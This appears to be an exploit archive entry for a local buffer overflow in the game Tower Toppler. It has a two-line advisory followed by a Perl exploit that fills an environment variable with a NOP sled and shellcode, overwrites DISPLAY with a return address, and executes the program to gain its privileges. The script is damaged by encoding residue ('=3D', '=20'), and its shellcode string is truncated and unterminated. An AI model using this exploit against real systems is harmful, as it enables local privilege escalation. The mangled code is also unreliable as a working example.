source: http://www.securityfocus.com/bid/7028/info

It has been reported that a buffer overflow exists in Tower Toppler. A local user may be able to exploit this issue to execute code with the privileges of the toppler program.

#!/usr/bin/perl
#kokanin@dtors.net playing a game
#hi bob
$len =3D 1024;
$ret =3D 0xbfbffd31;
$nop =3D "\x90";
$offset =3D 0;
$shellcode =3D =
"\x31\xc9\xf7\xe1\x51\x41\x51\x41\x51\x51\xb0\x61\xcd\x80\x89\xc3\x68\xD9\x9d;

if (@ARGV =3D=3D 1) {
    $offset =3D $ARGV[0];
}
 =20
for ($i =3D 0; $i < ($len - length($shellcode) - 100); $i++) {
    $buffer .=3D $nop;
}
=20
$buffer .=3D $shellcode;

$new_ret =3D pack('l', ($ret + $offset));
=20
for ($i +=3D length($shellcode); $i < $len; $i +=3D 4) {
    $buffer .=3D $new_ret;
}

local($ENV{'EGG'}) =3D $buffer;=20
local($ENV{'DISPLAY'}) =3D $new_ret x 64;=20

exec("toppler 2>/dev/null");